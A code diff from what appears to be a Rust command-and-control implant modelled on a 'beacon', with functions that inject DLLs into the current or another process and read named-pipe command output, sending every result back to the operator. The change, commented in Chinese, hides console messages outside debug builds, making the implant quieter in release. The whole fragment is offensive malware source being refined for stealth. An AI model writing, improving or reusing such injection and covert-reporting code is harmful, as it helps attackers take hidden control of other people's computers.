@@ -61,12 +61,18 @@ pub fn spawn_and_inject_dll(
         let result = inject_self(dll, 0);
         if result {
             let message = "inject self success";
-            println!("{}", message);
+            // 仅在 debug 模式下打印
+            if cfg!(debug_assertions) {
+                println!("{}", message);
+            }
             update_current_handle(pid, unsafe { GetCurrentProcess() });
             beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
         } else {
             let message = "inject self failed";
-            println!("{}", message);
+            // 仅在 debug 模式下打印
+            if cfg!(debug_assertions) {
+                println!("{}", message);
+            }
             beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap()
         }
     } else {
@@ -116,11 +122,17 @@ pub fn inject_dll(mut decrypted_cursor: Cursor<Vec<u8>>, is_x64: bool) {
         let result = inject_self(dll, offset as u32);
         if result {
             let message = "inject self success";
-            println!("{}", message);
+            // 仅在 debug 模式下打印
+            if cfg!(debug_assertions) {
+                println!("{}", message);
+            }
             beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
         } else {
             let message = "inject self failed";
-            println!("{}", message);
+            // 仅在 debug 模式下打印
+            if cfg!(debug_assertions) {
+                println!("{}", message);
+            }
             beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap()
         }
     } else {
@@ -151,7 +163,10 @@ pub fn inject_dll(mut decrypted_cursor: Cursor<Vec<u8>>, is_x64: bool) {
             beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
         } else {
             let message = "inject dll success";
-            println!("{}", message);
+            // 仅在 debug 模式下打印
+            if cfg!(debug_assertions) {
+                println!("{}", message);
+            }
             update_current_handle(pid as u32, process_handle);
             beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
         }
@@ -482,7 +497,10 @@ unsafe extern "system" fn read_named_pipe(job: Arc<Job>) -> Result<(), Error> {
     }
 
     let output = String::from_utf8_lossy(&buffer[..bytes_read as usize]);
-    println!("Command output: {}", output);
+    // 仅在 debug 模式下打印
+    if cfg!(debug_assertions) {
+        println!("Command output: {}", output);
+    }
     beacon_send_result(output.as_bytes(), &BEACON, job.callback as u32).unwrap();
 
     Ok(())
